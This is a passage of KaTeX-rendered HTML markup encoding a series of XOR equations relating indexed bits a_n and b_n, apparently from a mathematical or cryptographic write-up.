class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:0.6299999999999736em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:2.0699999999999714em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:3.509999999999969em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:4.949999999999966em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:6.389999999999968em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:7.829999999999972em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:9.269999999999976em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:10.709999999999981em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:12.149999999999986em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:13.589999999999995em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:15.03em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:16.470000000000006em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t 